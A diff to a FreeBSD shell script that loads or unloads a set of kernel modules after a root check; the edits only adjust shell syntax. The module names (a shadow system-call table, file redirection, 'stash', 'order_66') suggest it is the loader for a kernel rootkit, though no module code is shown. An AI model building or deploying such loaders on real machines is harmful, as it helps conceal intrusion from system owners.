@@ -1,8 +1,8 @@
 #!/bin/sh
 
-let euid=$(id -u)
+euid=$(id -u)
 
-if [ $euid -ne 0 ]; then
+if [ $euid != 0 ]; then
    echo "Must be root to run this"
    exit 1
 fi
@@ -11,8 +11,8 @@ MAGICK_STR=`grep "#define T_NAME" ./src/magick.h | awk '{print $3}' | sed s/\"//
 
 kldcmd="kldload -v "
 kmod_prefix="./obj/${MAGICK_STR}"
-let unload_tbl=0
-let test_mode=1
+unload_tbl=0
+test_mode=1
 while [ "$#" -gt 0 ]
 do
    arg="$1"
@@ -31,11 +31,11 @@ do
    esac
 done
 
-if [ $test_mode -eq 0 ]; then
+if [ $test_mode = 0 ]; then
    kmod_prefix="/boot/modules/${MAGICK_STR}"
 fi
 
-if [ $unload_tbl -eq 1 ]; then
+if [ $unload_tbl = 1 ]; then
    kldcmd="kldunload -v "
 else 
    $kldcmd ${kmod_prefix}_shdw_sysent_tbl.ko
@@ -49,6 +49,6 @@ $kldcmd ${kmod_prefix}_stash.ko
 $kldcmd ${kmod_prefix}_file_redirection.ko
 $kldcmd ${kmod_prefix}_order_66.ko
 
-if [ $unload_tbl -eq 1 ]; then
+if [ $unload_tbl = 1 ]; then
    $kldcmd ${kmod_prefix}_shdw_sysent_tbl.ko
 fi
